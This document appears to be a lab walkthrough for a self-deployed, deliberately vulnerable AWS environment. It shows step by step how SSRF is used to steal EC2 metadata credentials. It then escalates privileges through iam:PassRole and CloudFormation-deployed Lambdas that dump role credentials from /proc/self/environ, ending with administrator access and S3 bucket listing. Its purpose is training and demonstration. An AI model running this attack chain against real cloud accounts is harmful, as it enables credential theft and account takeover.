# Demo1 - Walkthrough

## Introduction

This first deom is intended to demonstrate a basic AWS initial access and privilege escalation abusing EC2 and Lambda services.

The provided Terraform code will create and setup a vulnerable environment, accessible only from the IP runnig the deployment.

## Scenario

_Ultima_ is slowly shifting to the cloud, porting most its Java on-premise services to AWS, using a web portal where logged and authorized users are able to upload and deploy CloudFormation stacks (IaC) using Yaml files.

For each deployment file, extensive security checks are performed to avoid deploying misconfigurations or allowing malicious activities.

You, the attacker, were able to find an SSRF vulnerability that allowed you to perform exploration of the local network. Your objective is to access the company data stored inside S3 buckets.

## Walkthrough

### Deployment

- Clone the repository and `cd` inside this folder
- `terraform init` to set up the required providers and environment
- `aws sts get-caller-identity` to confirm you are using the correct AWS profile able to deploy this scenario
  - **DISCLAIMER**: deploying this demos on production accounts may cause outages!
- `terraform apply` and then `yes` to approve the changes
  - use `terraform apply -auto-approved` if you live dangerously
- wait for the deployment (~2/3 mins) and you should receive an IP address and a SSH key (for debugging purposes) to access the EC2 machine

### Exploitation

Using the IP address perform a `nmap` scan to discover that the IP exposes two services:

- 22/tcp
- 3333/tcp

The 3333 service is vulnerable to SSRF using the `url` query parameter:

```bash
http <IP>:3333?url=http://ipinfo.io/ip


HTTP/1.1 200 OK
Content-Length: 21
Content-Type: text/plain; charset=utf-8
Date: Tue, 12 Jul 2022 15:19:55 GMT

Hello!<YOUR_PUBLIC_IP>
```

Other vulnerabilities may be present but to fully exploit the SSRF without querying other LAN services an attacker may try to dump the IAM role attached to the EC2 (if the vulnerable service is inside an EC2 and IMDSv2 is not enabled).

```bash
http <IP>:3333?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/cloudformation-deployer


HTTP/1.1 200 OK
Content-Length: 21
Content-Type: text/plain; charset=utf-8
Date: Tue, 12 Jul 2022 15:19:55 GMT

Hello!
{
    "Code": "Success",
    "Expiration": "2022-07-12T21:46:51Z",
    "LastUpdated": "2022-07-12T15:32:28Z",
    "AccessKeyId": "ASIAWFKZ7XCLEKJOCQNW",
    "SecretAccessKey": "sR2VLQXN1E8RwRVrJ04nocheQhh9tOhr2hMeNGMN",
    "Token": "IQoJb3JpZ2luX2Vj[..]f2GNuU8",
    "Type": "AWS-HMAC"
}
```

`AccessKeyId`, `SecretAccessKey` and `Token` are the credential used by the role attached in the EC2. An attacker may use them to connect to the victim AWS account.

```bash
unset AWS_SECRET_ACCESS_KEY; unset AWS_ACCESS_KEY_ID; unset AWS_SESSION_TOKEN

export AWS_ACCESS_KEY_ID="ASIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_SESSION_TOKEN="token"


aws sts get-caller-identity

{
    "UserId": "AROAWFKZ7XCLA4HFKPRYA:i-07dbd115f9cdb076b",
    "Account": "111111111111",
    "Arn": "arn:aws:sts::111111111111:assumed-role/cloudformation-deployer/i-07dbd115f9cdb076b"
}
```

From now on the attacker will not interact with the EC2 but only with AWS api endpoints.

The credentials are now loaded into a session and can be used with awscli to perform operation on the AWS account with the permissions of the role `cloudformation-deployer`.

The role has the following permissions:

```bash
aws iam get-role-policy --role-name cloudformation-deployer --policy-name EC2-CloudFormationDeployerPolicy

{
    "RoleName": "cloudformation-deployer",
    "PolicyName": "EC2-CloudFormationDeployerPolicy",
    "PolicyDocument": {
        "Statement": [
            {
                "Action": [
                    "cloudformation:CreateStack",
                    "iam:ListRolePolicies",
                    "iam:GetRolePolicy",
                    "cloudformation:DescribeStacks"
                ],
                "Effect": "Allow",
                "Resource": "*"
            }.
            {
                "Action": [
                    "iam:PassRole"
                ],
                "Effect": "Allow",
                "Resource": "arn:aws:iam::111111111111:role/demo1/service-deployer"
            }
        ],
        "Version": "2012-10-17"
    }
}
```

The `iam:PassRole`permission allows a user to pass a role to an AWS service. Passing roles is a vital element in AWS resource management. The PassRole is the AWS method to delegate the permission of a service: an application, for example, may need to perform certain actions on the backend, such as accessing databases or running Lambda functions, or in this case, create CloudFormation stacks.
Problems with the `iam:PassRole`permission occur when there is no defined role or set of roles that the principal is allowed to pass (`iam:PassRole:\*`). Inceed, this allows the user to pass **any** role that exists in the environment, including any existing privileged roles.

_N.B:_ you can pass a role to a service if and only if the AssumeRolePolicy of this role allows the target service.

In this scenario `iam:PassRole` action is granted only to the role `service-deployer` which has the following permissions:

```bash
aws iam get-role-policy --role-name service-deployer --policy-name Ultima-CustomDeployerPolicy

{
    "RoleName": "service-deployer",
    "PolicyName": "Ultima-CustomDeployerPolicy",
    "PolicyDocument": {
        "Statement": [
            {
                "Action": [
                    "lambda:*",
                    "ec2:*",
                ],
                "Effect": "Allow",
                "Resource": "*"
            }.
            {
                "Action": [
                    "iam:PassRole"
                ],
                "Effect": "Allow",
                "Resource": "arn:aws:iam::111111111111:role/demo1/*-runner"
            }
        ],
        "Version": "2012-10-17"
    }
}
```

We need to create a new CloudFormation stack, using the `cloudformation:CreateStack` allowed to `cloudformation-deployer` passing the role `service-deployer`. The stack will create a Lambda function or an EC2 instance where we can access.
The role to pass to the Lambda or the EC2 must have a name with `-runner` suffix.
We can bruteforce the roles using awscli.

```bash
aws iam list-role-policies --role-name unknown-runner

An error occurred (NoSuchEntity) when calling the ListRolePolicies operation: The role with name unknown-runner cannot be found.

aws iam list-role-policies --role-name admin-runner

An error occurred (NoSuchEntity) when calling the ListRolePolicies operation: The role with name unknown-runner cannot be found.

aws iam list-role-policies --role-name lambda-runner

{
    "PolicyNames": [
        "LambdaRunnerPolicy"
    ]
}
```

A role called `lambda-runner` is found with a inline policy: `LambdaRunnerPolicy`. This policy allows:

```bash
aws iam get-role-policy --role-name lambda-runner --policy-name LambdaRunnerPolicy

{
    "RoleName": "lambda-runner",
    "PolicyName": "LambdaRunnerPolicy",
    "PolicyDocument": {
        "Statement": [
            {
                "Action": [
                    "logs:CreateLogStream",
                    "logs:PutLogEvents",
                    "iam:ListAttachedRolePolicies",
                    "iam:ListRolePolicies",
                    "iam:GetRolePolicy",
                ],
                "Effect": "Allow",
                "Resource": "*"
            }.
            {
                "Action": [
                    "lambda:InvokeFunction",
                    "lambda:ListFunctions",
                ],
                "Effect": "Allow",
                "Resource": "*"
            }
        ],
        "Version": "2012-10-17"
    }
}
```

The CloudFormation Yaml definition is the following:

```yaml
AWSTemplateFormatVersion: "2010-09-09"
Resources:
  Demo1LambdaFun:
    Type: "AWS::Lambda::Function"
    Properties:
      Handler: index.handler
      Role: arn:aws:iam::111111111111:role/demo1/lambda-runner
      Code:
        ZipFile: |
          import os
          import json


          def handler(event, context):
              return open("/proc/self/environ").read()
      Runtime: python3.9
      Timeout: 5

  runtimeLambdaUrl:
    Type: "AWS::Lambda::Url"
    Properties:
      AuthType: NONE
      TargetFunctionArn: !Ref Demo1LambdaFun

  permissionForURLInvoke:
    Type: AWS::Lambda::Permission
    Properties:
      FunctionName: !Ref Demo1LambdaFun
      FunctionUrlAuthType: "NONE"
      Action: lambda:InvokeFunctionUrl
      Principal: "*"

Outputs:
  runtimeLambdaUrl:
    Value: !GetAtt runtimeLambdaUrl.FunctionUrl
```

To deploy the Yaml file:

```bash
aws cloudformation create-stack --stack-name demo1-privesc --template-body file://create-lambda.yaml --region eu-west-1 --role arn:aws:iam::111111111111:role/demo1/service-deployer
```

Once the deploy is completed a `FunctionUrl` FQDN is available in the output of the `describe-stacks` command:

```bash
aws cloudformation describe-stacks
```

To get the role AWS credentials invoke the function:

```bash
curl -s https://7ugah55qzqqzt3amghhxztvcpm0casis.lambda-url.eu-west-1.on.aws/ | sed 's/[\x00]/\n/g' | tr "=" " "

LANG en_US.UTF-8
AWS_XRAY_CONTEXT_MISSING LOG_ERROR
PATH /var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin
LAMBDA_RUNTIME_DIR /var/runtime
AWS_LAMBDA_LOG_GROUP_NAME /aws/lambda/demo1-privesc-Demo1LambdaFun-JEFvT6tPPqm
AWS_REGION eu-west-1
AWS_LAMBDA_RUNTIME_API 127.0.0.1:9001
_AWS_XRAY_DAEMON_PORT 2000
_LAMBDA_TELEMETRY_LOG_FD 3
_AWS_XRAY_DAEMON_ADDRESS 169.254.79.129
AWS_ACCESS_KEY_ID ASIA[..]LRX2
LAMBDA_TASK_ROOT /var/task
_HANDLER index.handler
AWS_LAMBDA_FUNCTION_VERSION $LATEST
AWS_LAMBDA_INITIALIZATION_TYPE on-demand
AWS_XRAY_DAEMON_ADDRESS 169.254.79.129:2000
AWS_EXECUTION_ENV AWS_Lambda_python3.9
TZ :UTC
LD_LIBRARY_PATH /var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib
AWS_SECRET_ACCESS_KEY fQ3M[..]DQO
AWS_SESSION_TOKEN IQoJb[..]ZiV/k
AWS_LAMBDA_FUNCTION_MEMORY_SIZE 128
AWS_DEFAULT_REGION eu-west-1
AWS_LAMBDA_FUNCTION_NAME demo1-privesc-Demo1LambdaFun-JEFvT6tPPqm
_LAMBDA_SERVER_PORT 42491
AWS_ACCESS_KEY ASIA[..]LRX2
AWS_SECRET_KEY fQ3M[..]DQO
AWS_SECURITY_TOKEN IQoJb[..]ZiV/k
```

Import the new credentials to impersonate `lambda-runner` role.

Perform an enumeration on the Lambdas to discover two new lambda:

- `backend-api-temp` with `temp-backend-api-role-runner` role
- `backend-lambda-api` with `lambda-runner` role

Investigate the `temp-backend-api-role-runner` role policies:

```bash
aws iam list-role-policies --role-name temp-backend-api-role-runner

{
    "PolicyNamnes": []
}

aws iam list-attached-role-policies --role-name temp-backend-api-role-runner

{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:Policy/AdministratorAccess"
        }
    ]
}
```

This role has Admin permissions!
To exploit this role we need to perform a step back since `lambda-runner` can't do much except listing functions.
Using the `cloudformation-deployer` we can create a new lambda that uses the `temp-backend-api-role-runner` role using CloudFormation. The PassRole filter is still valid since this new role has the `-runner` suffix.

The CloudFormation Yaml definition is the following:

```yaml
AWSTemplateFormatVersion: "2010-09-09"
Resources:
  Demo1LambdaFun:
    Type: "AWS::Lambda::Function"
    Properties:
      Handler: index.handler
      Role: arn:aws:iam::111111111111:role/demo1/temp-backend-api-role-runner
      Code:
        ZipFile: |
          import os
          import json


          def handler(event, context):
              return open("/proc/self/environ").read()
      Runtime: python3.9
      Timeout: 5

  runtimeLambdaUrl:
    Type: "AWS::Lambda::Url"
    Properties:
      AuthType: NONE
      TargetFunctionArn: !Ref Demo1LambdaFun

  permissionForURLInvoke:
    Type: AWS::Lambda::Permission
    Properties:
      FunctionName: !Ref Demo1LambdaFun
      FunctionUrlAuthType: "NONE"
      Action: lambda:InvokeFunctionUrl
      Principal: "*"

Outputs:
  runtimeLambdaUrl:
    Value: !GetAtt runtimeLambdaUrl.FunctionUrl
```

Execute the deployment and then wait for the lambda to be created. Access the function URL and using the dumped credentials to impersonate the role `temp-backend-api-role-runner`.
Use `aws s3api list-buckets` to list all buckets.
